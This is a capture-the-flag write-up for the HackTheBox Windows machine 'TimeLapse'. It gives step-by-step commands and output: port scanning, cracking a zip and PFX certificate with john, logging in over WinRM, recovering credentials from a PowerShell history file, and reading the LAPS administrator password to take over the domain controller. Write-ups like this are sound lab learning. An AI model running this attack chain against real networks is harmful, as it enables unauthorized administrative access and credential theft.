---
layout: default
title: "TimeLapse"
parent: HackTheBox
---

# TimeLapse: HackTheBox WriteUP
# Box Info

|-------|---------|
| Name | TimeLapse ⌚ |
| OS | Windows 🪟 |
| Rating | Easy |

# Enumration

### Nmap Scan
```shell-session
┌──(kali㉿kali)-[~/Desktop/Timing]
└─$ nmap --open timelapse.htb -Pn -p-                   
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-13 02:48 EDT
Stats: 0:06:12 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Nmap scan report for timelapse.htb (10.10.11.152)
Host is up (0.20s latency).
Not shown: 65517 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5986/tcp  open  wsmans
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49696/tcp open  unknown
63055/tcp open  unknown
```

### Enumrating SMB Shares
```shell-session
┌──(kali㉿kali)-[~/Desktop/Timing]
└─$ smbclient -L \\\\10.10.11.152  
Enter WORKGROUP\kali's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Shares          Disk      
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.152 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Exploring `Shares` Share :-

```shell-session
┌──(kali㉿kali)-[~/Desktop/Timing]
└─$ smbclient \\\\10.10.11.152\\Shares
Enter WORKGROUP\kali's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Oct 25 11:39:15 2021
  ..                                  D        0  Mon Oct 25 11:39:15 2021
  Dev                                 D        0  Mon Oct 25 15:40:06 2021
  HelpDesk                            D        0  Mon Oct 25 11:48:42 2021

smb: \Dev\> ls
  .                                   D        0  Mon Oct 25 15:40:06 2021
  ..                                  D        0  Mon Oct 25 15:40:06 2021
  winrm_backup.zip                    A     2611  Mon Oct 25 11:46:42 2021

smb: \HelpDesk\> dir
  .                                   D        0  Mon Oct 25 11:48:42 2021
  ..                                  D        0  Mon Oct 25 11:48:42 2021
  LAPS.x64.msi                        A  1118208  Mon Oct 25 10:57:50 2021
  LAPS_Datasheet.docx                 A   104422  Mon Oct 25 10:57:46 2021
  LAPS_OperationsGuide.docx           A   641378  Mon Oct 25 10:57:40 2021
  LAPS_TechnicalSpecification.docx      A    72683  Mon Oct 25 10:57:44 2021
```

Found some files out of which `winrm_back.zip` maylead to user.

#### Exploring File
`winrm_back.zip` is password protected and we don't have any password so lets crack it using **john**

```shell-session
┌──(kali㉿kali)-[~/Desktop/Timing]
└─$ zip2john winrm_backup.zip > zip.hash                                                                         82 ⨯
ver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683 ts=72AA cs=72aa type=8

┌──(kali㉿kali)-[~/Desktop/Timing]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)     
1g 0:00:00:04 DONE (2022-06-13 02:04) 0.2267g/s 786692p/s 786692c/s 786692C/s surkerior..suppamas
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

So the password is `supremelegacy`.

# User

On extracting the zip file we got a `.pfx` file which is kind of binary file containing a Private key and a Certificate together. To extract the Key and Certificate we need it's passphrase, so again using **john** to crack it's passphrase.

+ Refrence : [StackoverFlow how to run john ripper attack to p12 password educative pruposes](https://stackoverflow.com/questions/53547386/how-to-run-john-ripper-attack-to-p12-password-educative-pruposes).

```shell-session
──(kali㉿kali)-[~/Desktop/Timing]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt pfx.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:01:22 8.16% (ETA: 02:50:24) 0g/s 16065p/s 16065c/s 16065C/s samsin11..sammybear1
thuglegacy       (legacyy_dev_auth.pfx)                                                                               
1g 0:00:03:59 DONE (2022-06-13 02:37) 0.004177g/s 13498p/s 13498c/s 13498C/s thuglife06..thug211                      
Use the "--show" option to display all of the cracked passwords reliably                                              
Session completed.
```

So we got the passphrase: `thuglegacy`

Now we can extract the Certificate and Key from pfx file using `openssl`.
+ Reference : [IBM Extracting certificate-keys from pfx file](https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file)

```shell-session
┌──(kali㉿kali)-[~/Desktop/Timing]
└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out out.crt
Enter Import Password:


┌──(kali㉿kali)-[~/Desktop/Timing]
└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out out.key        
Enter Import Password:
Enter PEM pass phrase:
Verifying - Enter PEM pass phrase:
```

Now since we got both Certificate and Key we can log in as **Legacyy** user using**WinRM**.

```shell
$ evil-winrm -i timelapse.htb -u legacyy -S -k out.key -c out.crt
```

# Privilage Esclation 
On running `winPEAS.bat` on shell found something interesting

```text
C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

Read this history file

```powershell
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```

so lets try running these commands

```shell-session
*Evil-WinRM* PS C:\Users\legacyy\Documents> $so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
Enter PEM pass phrase:
*Evil-WinRM* PS C:\Users\legacyy\Documents> $p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
Enter PEM pass phrase:
*Evil-WinRM* PS C:\Users\legacyy\Documents> $c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
*Evil-WinRM* PS C:\Users\legacyy\Documents> invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami}
Enter PEM pass phrase:
timelapse\svc_deploy
```

So we can run commands as **svc_deploy** user. Getting more information about this user

```shell-session
*Evil-WinRM* PS C:\Users\legacyy\Documents> invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {net user svc_deploy}
Enter PEM pass phrase:
User name                    svc_deploy
Full Name                    svc_deploy
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/25/2021 12:12:37 PM
Password expires             Never
Password changeable          10/26/2021 12:12:37 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   6/13/2022 8:45:18 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *LAPS_Readers         *Domain Users
The command completed successfully.
```

So this user is a member of **LAPS_reader** group. **LAPS** is **L**ocal **A**dministrator **P**assword **S**olution which is manages passwords for local accounts of domain joined computers, And we can read those passwords.

+ Reference: [Audit laps permissions](https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/you-might-want-to-audit-your-laps-permissions/ba-p/2280785)

```shell-session
*Evil-WinRM* PS C:\Users\legacyy\Documents> invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {Get-ADComputer -Filter * -Properties MS-Mcs-AdmPwd | Where-Object MS-Mcs-AdmPwd -ne $null | FT Name, MS-Mcs-AdmPwd}
Enter PEM pass phrase:

Name MS-Mcs-AdmPwd
---- -------------
DC01 o#]3KU094(zSpwygT7LQQJ6t
```

now we can login as **Administrator** using the found password.

```shell
$ evil-winrm -i timelapse.htb -u Administrator -p "o#]3KU094(zSpwygT7LQQJ6t" -S
```
